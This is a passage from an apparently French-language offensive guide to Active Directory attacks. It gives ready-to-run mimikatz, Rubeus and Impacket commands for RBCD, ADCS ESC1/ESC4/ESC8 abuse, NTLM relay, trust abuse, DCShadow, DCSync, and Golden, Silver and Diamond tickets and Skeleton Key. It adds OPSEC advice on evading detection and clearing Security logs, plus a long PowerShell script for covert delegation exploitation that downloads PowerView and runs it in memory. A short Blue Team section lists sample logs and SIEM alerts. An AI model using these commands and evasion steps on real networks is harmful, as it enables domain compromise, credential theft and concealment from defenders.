4. **Exploitation avec Impacket**
   - Alternative à PowerView/Rubeus pour l'exploitation depuis Linux
   
   ```bash
   # Configurer RBCD avec ntlmrelayx.py (via NTLM Relay)
   ntlmrelayx.py -t ldap://dc.domain.local --delegate-access --escalate-user AttackerMachine$
   
   # Exploiter RBCD avec getST.py
   getST.py -spn cifs/TargetComputer.domain.local -impersonate administrator domain.local/AttackerMachine$:password
   
   # Utiliser le ticket
   export KRB5CCNAME=administrator.ccache
   smbclient.py -k domain.local/administrator@TargetComputer.domain.local
   ```

### Attaques basées sur les certificats

#### Abus de l'autorité de certification (ADCS)

1. **Principes de l'ADCS (Active Directory Certificate Services)**
   - Infrastructure à clé publique (PKI) intégrée à Active Directory
   - Permet l'émission et la gestion de certificats numériques
   - Utilisée pour l'authentification, le chiffrement, la signature de code, etc.
   - Vulnérable à plusieurs types d'attaques (ESC1-ESC8)

2. **Identification des cibles**
   - Découverte des services ADCS dans le domaine
   
   ```powershell
   # Avec Certify
   Certify.exe cas
   
   # Avec PowerView
   Get-DomainComputer -LDAPFilter "(servicePrincipalName=*CA*)"
   
   # Avec AD Module
   Get-ADComputer -Filter {ServicePrincipalName -like "*CA*"}
   ```

3. **ESC1 - Abus des modèles de certificats vulnérables**
   - Exploitation de modèles permettant l'authentification client et ayant des permissions trop permissives
   
   ```powershell
   # Étape 1: Identifier les modèles vulnérables
   Certify.exe find /vulnerable
   
   # Étape 2: Demander un certificat pour un utilisateur privilégié
   Certify.exe request /ca:CA.domain.local\CA /template:VulnerableTemplate /altname:administrator
   
   # Étape 3: Convertir le certificat en format utilisable
   openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
   
   # Étape 4: Utiliser le certificat pour l'authentification
   Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfx_password /nowrap /ptt
   ```

4. **ESC4 - Abus des droits de gestion des modèles**
   - Modification d'un modèle de certificat pour le rendre vulnérable
   
   ```powershell
   # Étape 1: Identifier les modèles que l'attaquant peut gérer
   Certify.exe find /manageable
   
   # Étape 2: Modifier le modèle pour permettre l'authentification client et l'usurpation d'identité
   # (Nécessite un accès GUI à la console de gestion des certificats)
   
   # Étape 3: Demander un certificat avec le modèle modifié
   Certify.exe request /ca:CA.domain.local\CA /template:ModifiedTemplate /altname:administrator
   
   # Étape 4: Utiliser le certificat comme dans ESC1
   ```

5. **ESC8 - NTLM Relay vers ADCS Web Enrollment**
   - Relais d'authentification NTLM vers le service d'inscription web ADCS
   
   ```bash
   # Étape 1: Configurer ntlmrelayx pour relayer vers ADCS Web Enrollment
   ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs
   
   # Étape 2: Forcer un utilisateur privilégié à s'authentifier auprès de l'attaquant
   # (ex: via SpoolService bug - PrinterBug)
   Invoke-SpoolSample -ComputerName dc.domain.local -TargetServer attacker-machine
   
   # Étape 3: ntlmrelayx génère un certificat pour l'utilisateur relayé
   
   # Étape 4: Utiliser le certificat pour l'authentification
   Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfx_password /nowrap /ptt
   ```

#### Attaques de relais de certificats

1. **NTLM Relay vers LDAPS**
   - Relais d'authentification NTLM vers LDAP over SSL/TLS
   - Permet de modifier des objets AD si l'utilisateur relayé a les droits
   
   ```bash
   # Configurer ntlmrelayx pour relayer vers LDAPS
   ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access --escalate-user AttackerMachine$
   
   # Forcer un utilisateur privilégié à s'authentifier auprès de l'attaquant
   Invoke-SpoolSample -ComputerName dc.domain.local -TargetServer attacker-machine
   ```

2. **Pass-the-Certificate**
   - Utilisation d'un certificat volé ou généré pour obtenir un TGT
   
   ```powershell
   # Avec Rubeus
   Rubeus.exe asktgt /user:username /certificate:cert.pfx /password:pfx_password /nowrap /ptt
   
   # Avec Impacket
   gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass pfx_password domain.local/username
   ```

### Attaques de forêt et de domaine

#### Abus des relations d'approbation (Trust Abuse)

1. **Principes des relations d'approbation**
   - Relations entre domaines ou forêts permettant l'authentification entre eux
   - Types: domaine parent-enfant, arbre, forêt externe, forêt de raccordement
   - Bidirectionnelles ou unidirectionnelles
   - Transitives ou non transitives

2. **Énumération des relations d'approbation**
   - Découverte des relations d'approbation dans l'environnement
   
   ```powershell
   # Avec PowerView
   Get-DomainTrust
   Get-ForestTrust
   
   # Avec AD Module
   Get-ADTrust -Filter *
   ```

3. **SID History Injection**
   - Abus de l'attribut SID History pour obtenir des accès entre domaines
   
   ```powershell
   # Avec mimikatz (nécessite des droits d'administrateur de domaine)
   mimikatz # lsadump::trust /patch
   
   # Extraction de la clé de confiance inter-domaine
   mimikatz # lsadump::dcsync /domain:domain.local /user:domain\krbtgt
   
   # Création d'un Golden Ticket avec SID History
   mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-domain /sids:S-1-5-21-trusted-domain-519 /krbtgt:krbtgt_hash /ticket:trust.kirbi
   
   # Utilisation du ticket
   mimikatz # kerberos::ptt trust.kirbi
   ```

4. **Abus des relations d'approbation externes**
   - Exploitation des relations d'approbation entre forêts
   
   ```powershell
   # Identification des utilisateurs avec accès entre forêts
   Get-DomainForeignGroupMember
   
   # Extraction de la clé de confiance inter-forêt
   mimikatz # lsadump::trust /patch
   
   # Création d'un ticket inter-forêt
   mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-domain /rc4:trust_key /service:krbtgt /target:external-forest.local /ticket:trust-forest.kirbi
   
   # Utilisation du ticket
   mimikatz # kerberos::ptt trust-forest.kirbi
   ```

#### Attaque DCShadow

1. **Principes de DCShadow**
   - Technique permettant de se faire passer pour un contrôleur de domaine
   - Permet de modifier des objets AD sans générer d'événements de modification standard
   - Nécessite des droits d'administrateur de domaine ou équivalents
   - Très discrète car contourne les mécanismes de journalisation standard

2. **Mise en œuvre avec Mimikatz**
   - Configuration et exécution d'une attaque DCShadow
   
   ```powershell
   # Étape 1: Lancer mimikatz avec les privilèges nécessaires
   
   # Étape 2: Enregistrer un contrôleur de domaine factice
   mimikatz # lsadump::dcshadow /object:targetUser /attribute:userAccountControl /value:0x10200
   
   # Étape 3: Dans une autre instance de mimikatz, pousser les modifications
   mimikatz # lsadump::dcshadow /push
   
   # Exemple: Ajouter un utilisateur au groupe Administrateurs du domaine
   mimikatz # lsadump::dcshadow /object:targetUser /attribute:primaryGroupID /value:512
   ```

3. **Détection et prévention**
   - Surveillance des modifications d'objets sensibles
   - Restriction des droits permettant l'enregistrement de services dans l'AD
   - Utilisation de solutions EDR pour détecter les comportements suspects

#### Attaque DCSync

1. **Principes de DCSync**
   - Technique permettant de simuler le comportement d'un DC lors de la réplication
   - Permet d'extraire des hachages de mots de passe sans exécuter de code sur un DC
   - Nécessite les droits "Replicating Directory Changes" et "Replicating Directory Changes All"
   - Moins discrète que DCShadow mais ne nécessite pas de droits d'administrateur de domaine

2. **Mise en œuvre avec Mimikatz**
   - Exécution d'une attaque DCSync pour extraire des hachages
   
   ```powershell
   # Extraction du hash NTLM de l'utilisateur Administrator
   mimikatz # lsadump::dcsync /domain:domain.local /user:domain\administrator
   
   # Extraction du hash NTLM de krbtgt (pour Golden Ticket)
   mimikatz # lsadump::dcsync /domain:domain.local /user:domain\krbtgt
   
   # Extraction de tous les hachages du domaine
   mimikatz # lsadump::dcsync /domain:domain.local /all
   ```

3. **Mise en œuvre avec Impacket**
   - Alternative à Mimikatz pour l'exécution depuis Linux
   
   ```bash
   # Extraction du hash NTLM de l'utilisateur Administrator
   secretsdump.py -just-dc domain.local/user:password@dc.domain.local
   
   # Extraction de tous les hachages du domaine
   secretsdump.py domain.local/user:password@dc.domain.local
   ```

4. **Détection et prévention**
   - Surveillance des événements de réplication anormaux
   - Restriction des droits de réplication aux seuls contrôleurs de domaine
   - Utilisation de solutions EDR pour détecter les comportements suspects

### Techniques de persistance avancées

#### Golden Ticket

1. **Principes du Golden Ticket**
   - Ticket Kerberos TGT forgé avec la clé du compte krbtgt
   - Permet d'obtenir des tickets pour n'importe quel service du domaine
   - Très difficile à détecter et à neutraliser
   - Persiste même après le changement de mot de passe de l'utilisateur ciblé

2. **Création avec Mimikatz**
   - Génération d'un Golden Ticket à partir du hash NTLM de krbtgt
   
   ```powershell
   # Extraction du SID du domaine
   whoami /user
   
   # Extraction du hash NTLM de krbtgt (via DCSync)
   mimikatz # lsadump::dcsync /domain:domain.local /user:domain\krbtgt
   
   # Création du Golden Ticket
   mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-domain /krbtgt:krbtgt_hash /ticket:golden.kirbi
   
   # Utilisation du ticket
   mimikatz # kerberos::ptt golden.kirbi
   ```

3. **Création avec Impacket**
   - Alternative à Mimikatz pour la création depuis Linux
   
   ```bash
   # Création du Golden Ticket
   ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-domain -domain domain.local Administrator
   
   # Utilisation du ticket
   export KRB5CCNAME=Administrator.ccache
   psexec.py -k domain.local/Administrator@dc.domain.local
   ```

4. **Détection et remédiation**
   - Surveillance des événements d'authentification Kerberos anormaux
   - Rotation régulière du mot de passe du compte krbtgt (deux fois)
   - Utilisation de solutions EDR pour détecter les comportements suspects

#### Silver Ticket

1. **Principes du Silver Ticket**
   - Ticket Kerberos TGS forgé pour un service spécifique
   - Nécessite le hash NTLM du compte de service ciblé
   - Plus discret que le Golden Ticket car limité à un service
   - Ne nécessite pas d'interaction avec un DC après création

2. **Création avec Mimikatz**
   - Génération d'un Silver Ticket pour un service spécifique
   
   ```powershell
   # Extraction du SID du domaine
   whoami /user
   
   # Extraction du hash NTLM du compte de service (ex: CIFS sur un serveur)
   mimikatz # sekurlsa::logonpasswords
   
   # Création du Silver Ticket pour le service CIFS
   mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-domain /target:server.domain.local /service:cifs /rc4:service_account_hash /ticket:silver.kirbi
   
   # Utilisation du ticket
   mimikatz # kerberos::ptt silver.kirbi
   ```

3. **Création avec Impacket**
   - Alternative à Mimikatz pour la création depuis Linux
   
   ```bash
   # Création du Silver Ticket
   ticketer.py -nthash service_account_hash -domain-sid S-1-5-21-domain -domain domain.local -spn cifs/server.domain.local Administrator
   
   # Utilisation du ticket
   export KRB5CCNAME=Administrator.ccache
   smbclient.py -k domain.local/Administrator@server.domain.local
   ```

4. **Détection et remédiation**
   - Surveillance des événements d'authentification Kerberos anormaux
   - Rotation régulière des mots de passe des comptes de service
   - Utilisation de solutions EDR pour détecter les comportements suspects

#### Diamond Ticket

1. **Principes du Diamond Ticket**
   - Variante plus discrète du Golden Ticket
   - Modification d'un TGT légitime plutôt que création complète
   - Conserve les éléments de sécurité du ticket original (PAC signature)
   - Plus difficile à détecter que le Golden Ticket classique

2. **Création avec Rubeus**
   - Génération d'un Diamond Ticket à partir d'un TGT légitime
   
   ```powershell
   # Demande d'un TGT légitime
   Rubeus.exe asktgt /user:lowprivuser /password:password /nowrap
   
   # Création du Diamond Ticket en modifiant le TGT
   Rubeus.exe diamond /tgt:base64_tgt_string /ticketuser:Administrator /ticketuserid:500 /groups:512 /nowrap
   
   # Utilisation du ticket
   Rubeus.exe ptt /ticket:base64_diamond_ticket
   ```

3. **Détection et remédiation**
   - Plus difficile à détecter que les Golden/Silver Tickets
   - Surveillance des incohérences entre les informations du ticket et l'utilisateur réel
   - Utilisation de solutions EDR avancées pour détecter les comportements suspects

#### Skeleton Key

1. **Principes de Skeleton Key**
   - Implantation d'un mot de passe maître dans les contrôleurs de domaine
   - Permet de s'authentifier en tant que n'importe quel utilisateur avec ce mot de passe
   - Les utilisateurs légitimes peuvent toujours utiliser leur mot de passe normal
   - Persiste jusqu'au redémarrage du contrôleur de domaine

2. **Déploiement avec Mimikatz**
   - Installation d'une Skeleton Key sur un contrôleur de domaine
   
   ```powershell
   # Déploiement de la Skeleton Key (mot de passe "mimikatz" par défaut)
   mimikatz # privilege::debug
   mimikatz # misc::skeleton
   
   # Authentification avec la Skeleton Key
   net use \\dc.domain.local\C$ /user:domain\administrator mimikatz
   Enter-PSSession -ComputerName dc.domain.local -Credential (Get-Credential)
   # Utiliser "mimikatz" comme mot de passe pour n'importe quel utilisateur
   ```

3. **Détection et remédiation**
   - Surveillance des processus et des modifications en mémoire sur les DC
   - Redémarrage régulier des contrôleurs de domaine
   - Utilisation de solutions EDR pour détecter les comportements suspects

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par les attaques de délégation

1. **Logs d'authentification Kerberos**
   - Événements liés à l'utilisation de S4U2self et S4U2proxy
   - Tickets demandés pour des services inhabituels
   - Impersonation d'utilisateurs privilégiés
   
   **Exemple de log (Windows Event ID 4769) :**
   ```
   Event ID: 4769
   Account Name: SERVICE$
   Service Name: krbtgt/DOMAIN.LOCAL
   Ticket Options: 0x40810000
   Ticket Encryption Type: 0x12
   Client Address: ::ffff:192.168.1.100
   ```

2. **Logs de modification d'objets AD**
   - Modifications des attributs liés à la délégation
   - Ajout ou modification de `msDS-AllowedToActOnBehalfOfOtherIdentity`
   
   **Exemple de log (Windows Event ID 5136) :**
   ```
   Event ID: 5136
   Object DN: CN=TargetComputer,CN=Computers,DC=domain,DC=local
   Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity
   Operation Type: Value Added
   ```

#### Traces générées par les attaques basées sur les certificats

1. **Logs d'émission de certificats**
   - Émission de certificats pour des utilisateurs privilégiés
   - Utilisation de modèles de certificats sensibles
   
   **Exemple de log (ADCS) :**
   ```
   Event ID: 4886
   Certificate Services: Certificate issued
   Requester: user
   Request ID: 123
   Requester ID: S-1-5-21-domain-1234
   Attributes: Subject:CN=Administrator,DC=domain,DC=local
   ```

2. **Logs d'authentification avec certificats**
   - Authentifications Kerberos utilisant des certificats
   - Multiples authentifications depuis des sources inhabituelles
   
   **Exemple de log (Windows Event ID 4768) :**
   ```
   Event ID: 4768
   Account Name: administrator@domain.local
   Certificate Information: MII...
   Client Address: ::ffff:192.168.1.100
   ```

#### Traces générées par les attaques de forêt et de domaine

1. **Logs de réplication AD**
   - Demandes de réplication depuis des sources non-DC (DCSync)
   - Réplications à des moments inhabituels
   
   **Exemple de log (Windows Event ID 4662) :**
   ```
   Event ID: 4662
   Account Name: user
   Object Name: DC=domain,DC=local
   Operation Type: Control Access
   Properties: DS-Replication-Get-Changes-All
   ```

2. **Logs d'enregistrement de services**
   - Enregistrement de nouveaux services SPN (DCShadow)
   - Modifications des objets de service
   
   **Exemple de log (Windows Event ID 5137) :**
   ```
   Event ID: 5137
   Object DN: CN=NTDS Settings,CN=AttackerMachine,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=domain,DC=local
   Object Class: nTDSDSA
   ```

#### Traces générées par les techniques de persistance

1. **Logs d'authentification Kerberos anormaux**
   - Tickets avec des durées de vie excessives (Golden Ticket)
   - Authentifications réussies sans validation préalable (Silver Ticket)
   - Incohérences dans les informations de ticket (Diamond Ticket)
   
   **Exemple de log (Windows Event ID 4769) :**
   ```
   Event ID: 4769
   Account Name: Administrator
   Service Name: krbtgt/DOMAIN.LOCAL
   Ticket Options: 0x40810000
   Ticket Encryption Type: 0x17
   Client Address: ::ffff:192.168.1.100
   ```

2. **Logs de processus et de mémoire**
   - Modifications de processus LSASS (Skeleton Key)
   - Injections de code dans des processus système
   
   **Exemple de log (Sysmon Event ID 10) :**
   ```
   Event ID: 10
   SourceProcessGUID: {A98268C1-9C2E-5ACD-0000-0010396CAB00}
   SourceProcessId: 624
   SourceImage: C:\Windows\System32\lsass.exe
   TargetProcessGUID: {A98268C1-9C2E-5ACD-0000-0010396CAB00}
   TargetProcessId: 624
   TargetImage: C:\Windows\System32\lsass.exe
   ```

#### Alertes SIEM typiques

**Alerte de délégation suspecte :**
```
[ALERT] Suspicious Kerberos Delegation Activity
Host: server01
User: SERVICE$
Time: 2023-05-15 14:23:45
Details: S4U2proxy request for privileged user (administrator) to access critical service
Severity: High
```

**Alerte d'abus de certificat :**
```
[ALERT] Certificate Abuse Detected
Host: ca.domain.local
User: user
Time: 2023-05-15 14:24:12
Details: Certificate issued for privileged user (administrator) using vulnerable template
Severity: Critical
```

**Alerte DCSync :**
```
[ALERT] Potential DCSync Attack
Host: workstation01
User: user
Time: 2023-05-15 14:35:27
Details: Non-DC account performing directory replication operations
Affected DC: dc.domain.local
Severity: Critical
```

**Alerte Golden Ticket :**
```
[ALERT] Potential Golden Ticket Usage
Host: workstation01
User: Administrator
Time: 2023-05-15 14:36:15
Details: Kerberos TGT with abnormal PAC or lifetime detected
Severity: Critical
```

### Pièges classiques et erreurs à éviter

#### Erreurs avec les attaques de délégation

1. **Mauvaise identification des cibles**
   - Ciblage de comptes sans les privilèges nécessaires
   - Tentative d'exploitation de délégation sur des services non configurés
   - Négligence des restrictions de délégation
   
   **Solution :** Effectuer une énumération complète avant l'exploitation, vérifier les attributs de délégation, comprendre les limitations de chaque type de délégation.

2. **Génération de bruit excessif**
   - Multiples tentatives d'exploitation en peu de temps
   - Utilisation de comptes sensibles pour les tests
   - Échec de nettoyage après exploitation
   
   **Solution :** Espacer les tentatives, utiliser des comptes moins surveillés quand c'est possible, nettoyer les modifications apportées.

3. **Problèmes de configuration Kerberos**
   - Problèmes d'horloge entre les systèmes
   - Mauvaise configuration des noms de domaine
   - Erreurs dans les SPN
   
   **Solution :** Vérifier la synchronisation des horloges, utiliser les FQDN complets, vérifier la syntaxe des SPN.

#### Erreurs avec les attaques basées sur les certificats

1. **Mauvaise configuration des certificats**
   - Certificats avec des attributs incorrects
   - Problèmes de chaîne de certificats
   - Erreurs dans les noms alternatifs du sujet (SAN)
   
   **Solution :** Vérifier attentivement les attributs des certificats, s'assurer que les SAN sont correctement configurés.

2. **Détection facile**
   - Émission de certificats pour des utilisateurs hautement privilégiés
   - Utilisation répétée des mêmes modèles vulnérables
   - Connexions multiples au service d'inscription
   
   **Solution :** Cibler des utilisateurs moins surveillés initialement, varier les modèles utilisés, limiter les connexions au service d'inscription.

3. **Problèmes de persistance**
   - Certificats avec des durées de validité trop courtes
   - Négligence de la sauvegarde des certificats
   - Révocation des certificats non anticipée
   
   **Solution :** Vérifier la durée de validité des certificats, sauvegarder les certificats obtenus, surveiller les événements de révocation.

#### Erreurs avec les attaques de forêt et de domaine

1. **Sous-estimation des protections**
   - Tentatives d'exploitation sans les privilèges nécessaires
   - Négligence des mécanismes de protection comme Protected Users
   - Sous-estimation de la surveillance des DC
   
   **Solution :** Vérifier les privilèges avant l'exploitation, comprendre les mécanismes de protection en place, adapter les techniques en conséquence.

2. **Génération d'alertes évidentes**
   - Exécution de DCSync depuis des postes de travail
   - Utilisation de comptes non administratifs pour des opérations sensibles
   - Tentatives multiples en cas d'échec
   
   **Solution :** Exécuter les attaques depuis des serveurs moins surveillés, utiliser des comptes appropriés, limiter les tentatives en cas d'échec.

3. **Problèmes de timing**
   - Exploitation pendant les heures de maintenance
   - Attaques pendant les périodes de haute activité
   - Négligence des fenêtres de détection
   
   **Solution :** Planifier les attaques pendant les heures normales de travail, éviter les périodes de maintenance ou de haute activité.

#### Erreurs avec les techniques de persistance

1. **Persistance trop visible**
   - Utilisation de Golden Tickets avec des durées excessives
   - Skeleton Key sur tous les DC
   - Modifications permanentes des objets AD
   
   **Solution :** Utiliser des tickets avec des durées raisonnables, limiter l'installation de Skeleton Key à un seul DC, préférer des modifications temporaires.

2. **Manque de diversité**
   - Utilisation d'une seule technique de persistance
   - Dépendance excessive à une seule méthode
   - Négligence des mécanismes de sauvegarde
   
   **Solution :** Combiner plusieurs techniques de persistance, avoir des plans de secours, prévoir des méthodes alternatives.

3. **Négligence de la détection**
   - Sous-estimation des capacités de détection
   - Utilisation de techniques connues sans modification
   - Activité excessive avec les mécanismes de persistance
   
   **Solution :** Comprendre les mécanismes de détection en place, adapter les techniques connues, limiter l'utilisation des mécanismes de persistance.

### OPSEC Tips : exploitation AD discrète

#### Techniques de base

1. **Limitation des requêtes LDAP**
   ```powershell
   # Au lieu de requêtes LDAP massives
   Get-DomainUser -Identity specific_user
   
   # Au lieu de
   Get-DomainUser | Where-Object {...}
   
   # Utiliser des filtres LDAP natifs
   Get-DomainUser -LDAPFilter "(description=*pass*)"
   ```

2. **Utilisation de comptes légitimes**
   ```powershell
   # Utiliser des comptes existants plutôt que d'en créer de nouveaux
   # Privilégier les comptes de service peu surveillés
   
   # Éviter les modifications permanentes
   # Préférer l'impersonation temporaire à la création/modification de comptes
   ```

3. **Timing des opérations**
   ```powershell
   # Exécuter les opérations pendant les heures de bureau normales
   # Éviter les activités en dehors des heures de travail habituelles
   
   # Espacer les opérations sensibles
   Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 300)
   ```

#### Techniques avancées

1. **Opérations multi-étapes**
   ```powershell
   # Diviser les attaques en plusieurs étapes discrètes
   # Exemple: Au lieu d'exécuter DCSync directement
   
   # Étape 1: Énumération ciblée
   Get-DomainUser -Identity specific_user -Properties objectsid,memberof
   
   # Étape 2: Élévation de privilèges locale
   # ...
   
   # Étape 3: Mouvement latéral vers un serveur moins surveillé
   # ...
   
   # Étape 4: Exécution de DCSync depuis ce serveur
   # ...
   ```

2. **Utilisation de chemins d'attaque indirects**
   ```powershell
   # Au lieu d'attaquer directement les administrateurs de domaine
   # Rechercher des chemins moins surveillés
   
   # Exemple: Cibler des administrateurs locaux de serveurs critiques
   # puis effectuer un mouvement latéral vers des systèmes plus sensibles
   ```

3. **Techniques de nettoyage**
   ```powershell
   # Nettoyage des logs
   wevtutil cl Security # (nécessite des privilèges élevés)
   
   # Suppression des artefacts
   Remove-Item -Path "C:\Users\user\Downloads\tool.exe" -Force
   
   # Restauration des configurations modifiées
   Set-DomainObject -Identity "CN=TargetComputer,CN=Computers,DC=domain,DC=local" -Clear "msDS-AllowedToActOnBehalfOfOtherIdentity"
   ```

#### Script OPSEC : Exploitation discrète de délégation contrainte

```powershell
# Script d'exploitation discrète de délégation contrainte avec considérations OPSEC

# Configuration
$LogFile = "C:\Temp\delegation_exploit.log"
$TargetDomain = "domain.local"
$MinDelay = 30
$MaxDelay = 120

# Fonction de logging discrète
function Write-Log {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] [$Level] $Message"
    
    # Logging local uniquement (pas de télémétrie)
    Add-Content -Path $LogFile -Value $LogEntry
    
    # Affichage console avec code couleur
    switch ($Level) {
        "INFO" { Write-Host $LogEntry -ForegroundColor Cyan }
        "SUCCESS" { Write-Host $LogEntry -ForegroundColor Green }
        "WARNING" { Write-Host $LogEntry -ForegroundColor Yellow }
        "ERROR" { Write-Host $LogEntry -ForegroundColor Red }
        default { Write-Host $LogEntry }
    }
}

# Fonction pour introduire un délai aléatoire
function Invoke-RandomDelay {
    $Delay = Get-Random -Minimum $MinDelay -Maximum $MaxDelay
    Write-Log "Waiting for $Delay seconds..." -Level "INFO"
    Start-Sleep -Seconds $Delay
}

# Fonction pour vérifier l'heure de travail
function Test-WorkHours {
    $CurrentHour = (Get-Date).Hour
    return ($CurrentHour -ge 9 -and $CurrentHour -le 17)
}

# Fonction pour vérifier les prérequis
function Test-Prerequisites {
    Write-Log "Checking prerequisites..." -Level "INFO"
    
    # Vérifier si PowerView est chargé
    if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
        Write-Log "PowerView not loaded. Attempting to load..." -Level "WARNING"
        try {
            # Chargement en mémoire pour éviter les artefacts disque
            $PowerViewUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
            $PowerViewCode = (New-Object System.Net.WebClient).DownloadString($PowerViewUrl)
            $PowerViewCode = $PowerViewCode -replace "Write-Verbose", "# Write-Verbose" # Réduire le bruit
            Invoke-Expression $PowerViewCode
            Write-Log "PowerView loaded successfully" -Level "SUCCESS"
        }
        catch {
            Write-Log "Failed to load PowerView: $_" -Level "ERROR"
            return $false
        }
    }
    
    # Vérifier si Rubeus est disponible
    if (-not (Test-Path "$env:TEMP\Rubeus.exe")) {
        Write-Log "Rubeus not found. Please ensure Rubeus.exe is available at $env:TEMP\Rubeus.exe" -Level "ERROR"
        return $false
    }
    
    # Vérifier les heures de travail
    if (-not (Test-WorkHours)) {
        Write-Log "Current time is outside normal work hours. This might trigger alerts." -Level "WARNING"
        $Continue = Read-Host "Continue anyway? (y/n)"
        if ($Continue -ne "y") {
            return $false
        }
    }
    
    return $true
}

# Fonction pour identifier les cibles de délégation contrainte
function Find-ConstrainedDelegationTargets {
    Write-Log "Searching for constrained delegation targets..." -Level "INFO"
    
    try {
        # Recherche ciblée plutôt que requête massive
        $DelegationTargets = Get-DomainUser -TrustedToAuth -Domain $TargetDomain
        $DelegationTargets += Get-DomainComputer -TrustedToAuth -Domain $TargetDomain
        
        if ($DelegationTargets.Count -eq 0) {
            Write-Log "No constrained delegation targets found" -Level "WARNING"
            return $null
        }
        
        Write-Log "Found $($DelegationTargets.Count) potential targets" -Level "SUCCESS"
        return $DelegationTargets
    }
    catch {
        Write-Log "Error searching for delegation targets: $_" -Level "ERROR"
        return $null
    }
}

# Fonction pour sélectionner une cible optimale
function Select-OptimalTarget {
    param (
        [Parameter(Mandatory=$true)]
        [array]$Targets
    )
    
    Write-Log "Selecting optimal target..." -Level "INFO"
    
    # Prioriser les comptes de service et les comptes machine moins surveillés
    $PriorityTargets = $Targets | Where-Object {
        ($_.samaccountname -like "*svc*") -or 
        ($_.samaccountname -like "*service*") -or
        ($_.samaccountname -like "*$")
    }
    
    if ($PriorityTargets.Count -gt 0) {
        $SelectedTarget = $PriorityTargets | Get-Random
        Write-Log "Selected priority target: $($SelectedTarget.samaccountname)" -Level "SUCCESS"
    }
    else {
        $SelectedTarget = $Targets | Get-Random
        Write-Log "No priority targets found, selected random target: $($SelectedTarget.samaccountname)" -Level "WARNING"
    }
    
    return $SelectedTarget
}

# Fonction pour analyser les services délégués
function Get-DelegatedServices {
    param (
        [Parameter(Mandatory=$true)]
        [object]$Target
    )
    
    Write-Log "Analyzing delegated services for $($Target.samaccountname)..." -Level "INFO"
    
    try {
        $Services = $Target.'msDS-AllowedToDelegateTo'
        
        if ($Services.Count -eq 0) {
            Write-Log "No delegated services found" -Level "WARNING"
            return $null
        }
        
        # Prioriser les services critiques (CIFS, LDAP, HOST)
        $PriorityServices = $Services | Where-Object {
            $_ -like "*cifs/*" -or $_ -like "*ldap/*" -or $_ -like "*host/*"
        }
        
        if ($PriorityServices.Count -gt 0) {
            $SelectedService = $PriorityServices | Get-Random
            Write-Log "Selected priority service: $SelectedService" -Level "SUCCESS"
        }
        else {
            $SelectedService = $Services | Get-Random
            Write-Log "No priority services found, selected random service: $SelectedService" -Level "WARNING"
        }
        
        return $SelectedService
    }
    catch {
        Write-Log "Error analyzing delegated services: $_" -Level "ERROR"
        return $null
    }
}

# Fonction pour exploiter la délégation contrainte
function Exploit-ConstrainedDelegation {
    param (
        [Parameter(Mandatory=$true)]
        [object]$Target,
        [Parameter(Mandatory=$true)]
        [string]$Service,
        [string]$ImpersonateUser = "administrator"
    )
    
    Write-Log "Preparing to exploit constrained delegation..." -Level "INFO"
    
    # Extraire les informations nécessaires
    $TargetAccount = $Target.samaccountname
    $ServiceParts = $Service -split "/"
    $ServiceType = $ServiceParts[0]
    $ServiceHost = $ServiceParts[1]
    
    Write-Log "Target Account: $TargetAccount" -Level "INFO"
    Write-Log "Service Type: $ServiceType" -Level "INFO"
    Write-Log "Service Host: $ServiceHost" -Level "INFO"
    Write-Log "User to Impersonate: $ImpersonateUser" -Level "INFO"
    
    # Obtenir le mot de passe ou hash du compte cible (dans un scénario réel, cela nécessiterait une étape préalable)
    $TargetPassword = Read-Host "Enter password for $TargetAccount" -AsSecureString
    $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($TargetPassword)
    $PlainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
    
    # Construire la commande Rubeus
    $RubeusPath = "$env:TEMP\Rubeus.exe"
    $RubeusArgs = "s4u /user:$TargetAccount /domain:$TargetDomain /password:$PlainPassword /impersonateuser:$ImpersonateUser /msdsspn:$Service /ptt"
    
    Write-Log "Executing Rubeus (command details omitted for security)..." -Level "INFO"
    
    try {
        # Exécuter Rubeus avec redirection de sortie pour analyse
        $RubeusOutput = & $RubeusPath $RubeusArgs.Split(" ")
        
        # Vérifier si l'exploitation a réussi
        if ($RubeusOutput -match "Ticket successfully imported") {
            Write-Log "Exploitation successful! Ticket imported into current session" -Level "SUCCESS"
            return $true
        }
        else {
            Write-Log "Exploitation may have failed. Check the following output:" -Level "WARNING"
            $RubeusOutput | ForEach-Object { Write-Log $_ -Level "INFO" }
            return $false
        }
    }
    catch {
        Write-Log "Error executing Rubeus: $_" -Level "ERROR"
        return $false
    }
    finally {
        # Nettoyer les variables sensibles
        $PlainPassword = $null
        [System.GC]::Collect()
    }
}

# Fonction pour tester l'accès obtenu
function Test-ExploitSuccess {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ServiceHost,
        [Parameter(Mandatory=$true)]
        [string]$ServiceType
    )
    
    Write-Log "Testing access to $ServiceType on $ServiceHost..." -Level "INFO"
    
    try {
        switch ($ServiceType.ToLower()) {
            "cifs" {
                $TestPath = "\\$ServiceHost\C$"
                if (Test-Path $TestPath) {
                    Write-Log "Successfully accessed $TestPath" -Level "SUCCESS"
                    $Files = Get-ChildItem -Path $TestPath -ErrorAction SilentlyContinue | Select-Object -First 5
